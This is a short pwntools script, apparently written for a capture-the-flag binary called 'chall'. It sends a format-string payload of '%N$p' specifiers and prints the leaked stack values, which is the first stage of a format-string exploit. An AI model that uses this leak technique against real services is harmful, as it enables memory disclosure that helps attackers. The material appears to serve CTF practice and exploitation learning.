from pwn import *

elf = context.binary = ELF("chall", checksec=False)

def run(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote("remote", 1337)
    else:
        return process(elf.path)
    
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

io = run()

# Plumbing



# Leak

start = 1
amount = 50

p = b" ".join([f"%{i}$p".encode() for i in range(start, start + amount + 1)]) + b"\n"
io.sendline(p)
leak = io.recvline().strip()
leaks = leak.decode().split()[0:]
print("===== Leaks =====")
max_index_length = len(str(start + amount))
for index, value in enumerate(leaks, start=1):
    current_index = index + start - 1
    print(f"{current_index}:{" " * (max_index_length - len(str(current_index)) + 1)}{value}")
